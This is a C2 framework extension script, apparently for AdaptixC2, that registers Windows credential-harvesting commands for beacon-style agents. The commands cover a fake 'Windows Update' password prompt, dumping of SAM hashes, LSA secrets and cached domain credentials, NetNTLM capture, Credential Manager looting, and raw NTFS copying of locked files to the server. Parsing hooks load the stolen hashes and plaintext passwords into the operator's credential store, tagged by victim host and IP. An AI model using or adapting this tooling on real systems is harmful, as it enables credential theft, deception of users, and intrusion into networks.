var metadata = {
    name: "Creds-BOF",
    description: "BOF tools that can be used to harvest passwords"
};

ax.script_import(ax.script_dir() + "nanodump/nanodump.axs")
ax.script_import(ax.script_dir() + "cookie-monster/cookie-monster.axs")

/// COMMANDS

var cmd_askcreds = ax.create_command("askcreds", "Prompt for credentials", "askcreds -p \"Windows Update\"");
cmd_askcreds.addArgFlagString("-p", "prompt",    "", "Restore Network Connection");
cmd_askcreds.addArgFlagString("-n", "note",      "", "Please verify your Windows user credentials to proceed");
cmd_askcreds.addArgFlagInt(   "-t", "wait_time", "", 30);
cmd_askcreds.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let prompt    = parsed_json["prompt"];
    let note      = parsed_json["note"];
    let wait_time = parsed_json["wait_time"];

    let bof_params = ax.bof_pack("wstr,wstr,int", [prompt, note, wait_time]);
    let bof_path = ax.script_dir() + "_bin/askcreds." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF implementation: askcreds");
});



var cmd_autologon = ax.create_command("autologon", "Checks the registry for autologon information", "autologon");
cmd_autologon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/autologon." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: autologon");
});



var cmd_credman = ax.create_command("credman", "Checks the current user's Windows Credential Manager for saved web passwords", "credman");
cmd_credman.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/credman." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: credman");
});



var cmd_get_ntlm = ax.create_command("get-netntlm", "Retrieve NetNTLM hash for the current user", "get-netntlm --no-ess");
cmd_get_ntlm.addArgBool( "--no-ess", "The option can be utilized and if you would like the attempt to disable session security in NetNTLMv1");
cmd_get_ntlm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let no_ess = 0;
    if(parsed_json["--no-ess"]) { no_ess = 1; }

    let bof_params = ax.bof_pack("int", [no_ess]);
    let bof_path = ax.script_dir() + "_bin/get-netntlm." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "BOF implementation: Internal Monologue");
});



var cmd_hashdump = ax.create_command("hashdump", "Dump SAM hashes", "hashdump");
cmd_hashdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task)
    {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        let regex = /^([a-zA-Z0-9_\-]+):\d+:([a-fA-F0-9]{32})$/gm;
        while ((match = regex.exec(task.text)) !== null) {
            ax.credentials_add(match[1], match[2], "", "ntlm", "", "SAM", `${computer} (${address})`);
        }

        return task;
    }
    let bof_path = ax.script_dir() + "_bin/hashdump." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF implementation: hashdump", hook);
});



var cmd_lsadump_secrets = ax.create_command("lsadump_secrets", "Dump LSA secrets from SECURITY hive (requires SYSTEM)", "lsadump_secrets");
cmd_lsadump_secrets.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let accumulatedText = "";
    let processedSecrets = new Set();
    
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        if (task.text) {
            accumulatedText += task.text;
        }
        
        // Match service secrets with format:
        // Secret  : _SC_<ServiceName>
        //  / service '<ServiceName>' with username : <username>
        // cur/text: <password>
        // or
        // old/text: <password>
        let fullText = accumulatedText;
        let lines = fullText.split(/\r?\n/);
        
        let currentSecret = null;
        let currentService = null;
        let currentUsername = null;
        let secretsFound = 0;
        let credentialsAdded = 0;
        
        for (let i = 0; i < lines.length; i++) {
            let line = lines[i];
            
            let secretMatch = line.match(/Secret\s+:\s+_SC_(.+)/);
            if (secretMatch) {
                secretsFound++;
                let secretName = secretMatch[1].trim();
                
                if (currentSecret && currentService && currentUsername) {
                    for (let j = currentSecret.lineIndex + 1; j < lines.length; j++) {
                        let pwdLine = lines[j];
                        
                        if (pwdLine.match(/Secret\s+:/)) break;
                        
                        let curMatch = pwdLine.match(/cur\/text:\s+(.+)/);
                        if (curMatch) {
                            let password = curMatch[1].trim();
                            if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                                let domain = "";
                                let user = currentUsername;
                                if (currentUsername.includes("\\")) {
                                    let parts = currentUsername.split("\\");
                                    domain = parts[0];
                                    user = parts.slice(1).join("\\");
                                }
                                let credKey = `${currentService}:${user}:${password}:cur`;
                                if (!processedSecrets.has(credKey)) {
                                    processedSecrets.add(credKey);
                                    let tag = domain ? `${domain} / ${currentService}` : currentService;
                                    ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret", `${computer} (${address})`);
                                    credentialsAdded++;
                                }
                            }
                        }
                        
                        let oldMatch = pwdLine.match(/old\/text:\s+(.+)/);
                        if (oldMatch) {
                            let password = oldMatch[1].trim();
                            if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                                let domain = "";
                                let user = currentUsername;
                                if (currentUsername.includes("\\")) {
                                    let parts = currentUsername.split("\\");
                                    domain = parts[0];
                                    user = parts.slice(1).join("\\");
                                }
                                let credKey = `${currentService}:${user}:${password}:old`;
                                if (!processedSecrets.has(credKey)) {
                                    processedSecrets.add(credKey);
                                    let tag = domain ? `${domain} / ${currentService}` : currentService;
                                    ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret (old)", `${computer} (${address})`);
                                    credentialsAdded++;
                                }
                            }
                        }
                    }
                }
                
                currentSecret = {name: secretName, lineIndex: i};
                currentService = null;
                currentUsername = null;
                continue;
            }
            
            if (currentSecret) {
                let serviceMatch = line.match(/service\s+'([^']+)'\s+with\s+username\s+:\s+(.+)/);
                if (serviceMatch) {
                    currentService = serviceMatch[1];
                    currentUsername = serviceMatch[2].trim();
                }
            }
        }
        
        if (currentSecret && currentService && currentUsername) {
            for (let j = currentSecret.lineIndex + 1; j < lines.length; j++) {
                let pwdLine = lines[j];
                
                if (pwdLine.match(/Secret\s+:/)) break;
                
                let curMatch = pwdLine.match(/cur\/text:\s+(.+)/);
                if (curMatch) {
                    let password = curMatch[1].trim();
                    if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                        let domain = "";
                        let user = currentUsername;
                        if (currentUsername.includes("\\")) {
                            let parts = currentUsername.split("\\");
                            domain = parts[0];
                            user = parts.slice(1).join("\\");
                        }
                        let credKey = `${currentService}:${user}:${password}:cur`;
                        if (!processedSecrets.has(credKey)) {
                            processedSecrets.add(credKey);
                            let tag = domain ? `${domain} / ${currentService}` : currentService;
                            ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret", `${computer} (${address})`);
                            credentialsAdded++;
                        }
                    }
                }
                
                let oldMatch = pwdLine.match(/old\/text:\s+(.+)/);
                if (oldMatch) {
                    let password = oldMatch[1].trim();
                    if (password && password.length > 0 && !password.includes("Cached domain credentials key")) {
                        let domain = "";
                        let user = currentUsername;
                        if (currentUsername.includes("\\")) {
                            let parts = currentUsername.split("\\");
                            domain = parts[0];
                            user = parts.slice(1).join("\\");
                        }
                        let credKey = `${currentService}:${user}:${password}:old`;
                        if (!processedSecrets.has(credKey)) {
                            processedSecrets.add(credKey);
                            let tag = domain ? `${domain} / ${currentService}` : currentService;
                            ax.credentials_add(user, password, "", "plaintext", tag, "LSA Secret (old)", `${computer} (${address})`);
                            credentialsAdded++;
                        }
                    }
                }
            }
        }
        
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_secrets." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::secrets", hook);
});


var cmd_lsadump_sam = ax.create_command("lsadump_sam", "Dump SAM hashes (requires admin)", "lsadump_sam");
cmd_lsadump_sam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        let regex = /^([a-zA-Z0-9_\-]+):(\d+):([a-fA-F0-9]{32})$/gm;
        while ((match = regex.exec(task.text)) !== null) {
            ax.credentials_add(match[1], match[3], "", "ntlm", "", "SAM", `${computer} (${address})`);
        }
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_sam." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::sam", hook);
});


var cmd_lsadump_cache = ax.create_command("lsadump_cache", "Dump cached domain credentials (DCC2/MSCacheV2, requires SYSTEM)", "lsadump_cache");
cmd_lsadump_cache.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let hook = function (task) {
        let agent = ax.agents()[task.agent];
        let computer = agent["computer"];
        let address = agent["internal_ip"];

        let match;
        // Match: MsCacheV2 : <hash>
        let regex = /User\s+:\s+([^\\\n]+)\\([^\n]+)\nMsCacheV2\s+:\s+([a-fA-F0-9]{32})/gm;
        while ((match = regex.exec(task.text)) !== null) {
            let domain = match[1];
            let username = match[2];
            let hash = match[3];
            ax.credentials_add(username, hash, "", "dcc2", domain, "DCC2", `${computer} (${address})`);
        }
        return task;
    }
    let bof_path = ax.script_dir() + "_bin/lsadump_cache." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "BOF: lsadump::cache", hook);
});



var cmd_underlaycopy = ax.create_command("underlaycopy", "Copy file using low-level NTFS access (MFT or Metadata mode)", "underlaycopy MFT C:\\Windows\\System32\\notepad.exe -w C:\\temp\\notepad_copy.exe");
cmd_underlaycopy.addArgString("mode", true, "Copy mode: MFT or Metadata");
cmd_underlaycopy.addArgString("source", true, "Source file path");
cmd_underlaycopy.addArgFlagString("-w", "destination", "Destination file path (required if --download is not used)", "");
cmd_underlaycopy.addArgBool("--download", "Download file to server instead of saving to disk");
cmd_underlaycopy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let mode = parsed_json["mode"];
    let source = parsed_json["source"];
    let dest = parsed_json["destination"] || "";
    let download = parsed_json["--download"] ? 1 : 0;
    if (mode !== "MFT" && mode !== "Metadata") {
        ax.console_message(id, "Error: Mode must be 'MFT' or 'Metadata'", "error");
        return;
    }
    // If destination starts with '--', it's likely a flag, not a destination path
    if (dest && dest.startsWith("--")) {
        dest = "";
    }

    if (!download && !dest) {
        ax.console_message(id, "Error: Either destination path or --download option must be provided", "error");
        return;
    }

    // Always pass destination (empty string if not provided)
    // The order matters: mode, source, dest, download
    let bof_params = ax.bof_pack("cstr,cstr,cstr,int", [mode, source, dest || "", download]);
    let bof_path = ax.script_dir() + "_bin/underlaycopy." + ax.arch(id) + ".o";

    let task_desc = download ? "Task: UnderlayCopy file copy and download to server" : "Task: UnderlayCopy file copy";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, task_desc);
});



var group_test = ax.create_commands_group("Creds-BOF", [
    cmd_askcreds, cmd_autologon, cmd_credman, cmd_get_ntlm, cmd_hashdump, cmd_cookie_monster,
    cmd_nanodump, cmd_nanodump_ppl_dump, cmd_nanodump_ppl_medic, cmd_nanodump_ssp, cmd_underlaycopy,
    cmd_lsadump_secrets, cmd_lsadump_sam, cmd_lsadump_cache
]);
ax.register_commands_group(group_test, ["beacon", "gopher", "kharon"], ["windows"], []);



/// MENU

let hashdump_access_action = menu.create_action("SAM hashdump", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "hashdump")) });
menu.add_session_access(hashdump_access_action, ["beacon", "gopher", "kharon"], ["windows"]);